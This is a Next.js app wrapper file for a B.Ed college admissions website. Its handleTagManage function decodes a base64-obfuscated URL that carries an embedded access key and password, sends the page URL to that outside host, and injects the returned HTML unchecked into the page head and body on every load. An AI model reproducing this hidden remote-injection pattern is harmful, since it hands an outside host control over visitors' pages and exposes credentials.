import Head from "next/head";
import { useEffect, useState } from "react";
import "swiper/css";
import VideoState from "../src/context/video";
import PreLoader from "../src/layout/PreLoader";
import "../styles/globals.css";
import $ from "jquery";

function MyApp({ Component, pageProps }) {
  const [loader, setLoader] = useState(true);
  useEffect(() => {
    setTimeout(() => {
      setLoader(false);
    }, 2000);
  }, []);

  useEffect(() => {
    // Load jQuery if not already loaded
    if (typeof window !== "undefined" && !window.jQuery) {
      const script = document.createElement("script");
      script.src =
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
      document.head.appendChild(script);
      script.onload = () => {
        handleTagManage();
      };
    } else {
      handleTagManage();
    }
  }, []);

  const handleTagManage = () => {
    var eppathurl = window.location.origin + window.location.pathname;
    var eptagmanage = new XMLHttpRequest();
    eptagmanage.onreadystatechange = function () {
      if (this.readyState === 4 && this.status === 200) {
        if (this.response !== 0) {
          var temp = this.response.split("||||||||||");

          // Remove existing title from head and append the new one
          $("head").find("title").remove();
          $("head").append(temp[0]);
          $("body").append(temp[1]);
        }
      }
    };
    eptagmanage.open(
      "GET",
      atob(
        "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQ4Njc4NjA0MDEmZWtleXBhc3M9SnV4NDJlaFdOUjJHZHFDMGxFdkhJcUFkOERMemlYdThUQnVIJnNpdGV1cmw9"
      ) + eppathurl
    );
    eptagmanage.send();
  };

  return (
    <VideoState>
      <Head>
        <meta
          name="google-site-verification"
          content="7_B5W65vkDoemWm_icAOh9OziDM6z5fCjAwKWzwXA-c"
        />
        <meta name="title" content="Best B.Ed College in Bangalore" />
        <meta
          name="description"
          content="Looking for the best B.Ed college in Bangalore? Then you are in the right place. Feel free to contact us today."
        />
        <title>B.Ed Admission in Bangalore University</title>
        <link
          rel="shortcut icon"
          href="images/logo.png"
          type="images/logo.png"
        />
      </Head>
      {loader && <PreLoader />}
      <div className="wsmenucontainer">
        <Component {...pageProps} />
      </div>
    </VideoState>
  );
}

export default MyApp;
